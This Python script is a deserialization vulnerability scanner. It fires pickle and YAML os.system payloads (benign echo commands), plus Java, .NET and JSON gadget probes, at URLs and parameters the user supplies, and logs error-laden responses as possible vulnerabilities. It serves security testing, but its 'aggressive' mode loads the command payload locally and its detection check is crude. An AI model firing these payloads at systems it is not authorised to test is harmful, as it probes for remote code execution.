import requests
import base64
import threading
import time
from datetime import datetime
import yaml

results = []
lock = threading.Lock()

payloads = {
    "java": b"\xac\xed\x00\x05t\x00\x04test",  # Java serialized string
    "pickle": base64.b64encode(b"cposix\nsystem\n(S'echo pickle payload'\ntR.").decode(),
    "dotnet": base64.b64encode(b"\x00\x01\x00\x00").decode(),
    "yaml": '!!python/object/apply:os.system ["echo yaml payload"]',
    "json": '{"@type":"java.lang.AutoCloseable","val":"payload"}'
}

def send_payload(url, param, method, ptype, mode):
    payload = payloads[ptype]
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    if mode == "aggressive" and ptype == "yaml":
        try:
            payload = yaml.dump(yaml.load(payload, Loader=yaml.FullLoader))
        except Exception:
            pass

    data = {param: payload}
    try:
        if method == "GET":
            response = requests.get(url, params=data, headers=headers, timeout=10)
        else:
            response = requests.post(url, data=data, headers=headers, timeout=10)

        indicator = "Exception" in response.text or "error" in response.text.lower()

        with lock:
            results.append({
                "url": url,
                "param": param,
                "payload_type": ptype,
                "mode": mode,
                "status_code": response.status_code,
                "response_snippet": response.text[:100],
                "possible_vuln": indicator,
                "timestamp": datetime.utcnow().isoformat()
            })

            if indicator:
                print(f"[!] Possible issue detected on {url} with {ptype} payload")
            else:
                print(f"[-] No issue on {url} with {ptype} payload")

    except Exception as e:
        with lock:
            results.append({
                "url": url,
                "param": param,
                "payload_type": ptype,
                "mode": mode,
                "status_code": "ERROR",
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat()
            })
        print(f"[!] Error scanning {url}: {e}")

def run_deserialization_checker():
    print("\n--- Deserialization Vulnerability Checker ---")
    urls = input("Enter comma-separated URLs: ").strip().split(",")
    urls = [u.strip() for u in urls if u]

    param = input("Parameter to test: ").strip()
    method = input("Method [GET/POST]: ").strip().upper()
    mode = input("Mode [passive/aggressive]: ").strip().lower()

    print("\nSelect payload types to test:")
    print("1. Java")
    print("2. Pickle")
    print("3. .NET")
    print("4. YAML")
    print("5. JSON")
    selected = input("Enter numbers separated by commas (e.g., 1,2,4): ").split(",")

    payload_keys = {
        "1": "java",
        "2": "pickle",
        "3": "dotnet",
        "4": "yaml",
        "5": "json"
    }

    selected_types = [payload_keys[s.strip()] for s in selected if s.strip() in payload_keys]

    threads = []
    for url in urls:
        for ptype in selected_types:
            t = threading.Thread(target=send_payload, args=(url, param, method, ptype, mode))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    with open("deserialization_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    print("\n[+] Scan complete. Results saved to deserialization_results.txt.")

